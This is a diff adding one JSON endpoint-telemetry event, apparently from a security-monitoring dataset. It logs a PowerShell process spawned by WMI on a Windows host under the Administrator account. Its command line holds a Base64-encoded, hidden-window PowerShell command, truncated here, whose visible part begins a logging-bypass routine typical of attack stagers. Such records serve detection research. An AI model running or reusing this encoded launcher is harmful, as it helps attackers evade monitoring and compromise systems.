@@ -1,0 +1,21 @@
+{
+  "action": "CREATE",
+  "actorID": "e0375037-23c7-4b9b-8446-59fb61eb12a5",
+  "hostname": "SysClient0069.systemia.com",
+  "id": "75f5ebc2-dd6e-4cbc-b9af-8ba90118aedc",
+  "object": "PROCESS",
+  "objectID": "a80f73dc-5713-4608-8a67-f1e6690e63ff",
+  "pid": 4152,
+  "ppid": 2288,
+  "principal": "SYSTEMIACOM\\Administrator",
+  "properties": {
+    "acuity_level": "1",
+    "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcARQB0AFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB",
+    "image_path": "powershell.exe",
+    "parent_image_path": "\\Device\\HarddiskVolume1\\Windows\\system32\\wbem\\wmiprvse.exe",
+    "sid": "S-1-5-21-4190936083-3304963419-1584388968-500",
+    "user": "SYSTEMIACOM\\Administrator"
+  },
+  "tid": -1,
+  "timestamp": "2019-09-24T15:41:17.073-04:00"
+}
